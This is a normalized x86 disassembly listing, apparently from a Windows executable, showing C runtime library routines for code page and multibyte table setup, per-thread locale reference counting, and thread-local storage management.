push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_2003575
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_20035a4
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_2007940
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_2003608
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_200b4f2
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_20088fa
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_20088fa
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_2002d91
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_2007940
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_200379b
push 0xc
push r--data
call sub_200625c
call sub_2004244
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2003836
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_20062a1
retn
push 0x20
call sub_2002e95
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_20016b0
pop ecx
sub_200383f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_200144c
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_20038bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_200383f
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_20035a4
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_2007940
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2002d91
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_2003575
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_2003608
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_2007940
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_2003575
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_2003aa0
push 0x14
push r--data
call sub_200625c
or [ ebp - 0x20 ] 0xffffffff
call sub_2004244
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_200379b
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_200383f
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_200b534
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_20062a1
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_20038bb
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_20047ce
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_20016b0
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_20016b0
pop ecx
push 0xd
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2003c01
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_20016b0
pop ecx
sub_2003c58
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_20016b0
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_20016b0
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_20016b0
push [ esi + 0xc0 ]
call sub_20016b0
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_200b665
push [ edi ]
call sub_20016b0
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_20016b0
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_20016b0
pop ecx
push [ esi + 0xb0 ]
call sub_20016b0
push [ esi + 0xbc ]
call sub_20016b0
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_20016b0
push [ esi + 0xbc ]
call sub_200b83f
pop ecx
pop ecx
push eax
call sub_20016b0
pop ecx
push eax
call sub_20016b0
push [ esi + 0xbc ]
call sub_200b7fa
pop ecx
pop ecx
sub_2003da1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_2003e30
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_2003ec9
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_2003da1
pop ecx
test esi esi
je r-xdata
push esi
call sub_2003e30
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_2003c58
pop ecx
sub_2003f07
push 0xc
push r--data
call sub_200625c
call sub_2004244
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_2003ec9
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2003f71
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_2004244
mov esi [ eax + 0x6c ]
mov eax esi
call sub_20062a1
retn
push 0x20
call sub_2002e95
pop ecx
sub_2003f7d
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_2002e65
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_2003ff8
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_2002e65
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_2004073
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_2003ff8
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_20040a7
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_2003ff8
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_2005634
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_20040e4
push 0xc
push r--data
call sub_200625c
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_2002e65
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20041b9
push 0xc
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_2003da1
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20041c2
call sub_20062a1
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_20041cb
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_2004073
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_200b579
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_2003ff8
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_20016b0
pop ecx
xor esi esi
push 0x0
push esi
call sub_20040e4
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_200425e
push 0x8
push r--data
call sub_200625c
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_20062a1
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_20016b0
pop ecx
push 0xd
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_20016b0
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2004378
push 0xc
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2004384
push esi
call sub_20016b0
pop ecx
push edi
call sub_2003e30
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_20016b0
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_2003c58
pop ecx
sub_200438d
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_2002e65
pop ecx
call sub_20040a7
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_200406a
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_200314f
push [ rw-data ]
call sub_2003f7d
push [ rw-data ]
mov [ rw-data ] eax
call sub_2003f7d
push [ rw-data ]
mov [ rw-data ] eax
call sub_2003f7d
push [ rw-data ]
mov [ rw-data ] eax
call sub_2003f7d
add esp 0x10
mov [ rw-data ] eax
call sub_20055e9
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_200425e
push [ rw-data ]
call sub_2003ff8
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_200b579
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_2003ff8
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_20040e4
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_200451a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_200144c
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_20047ce
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_200893f
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_200898a
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_20088fa
add esp 0x24
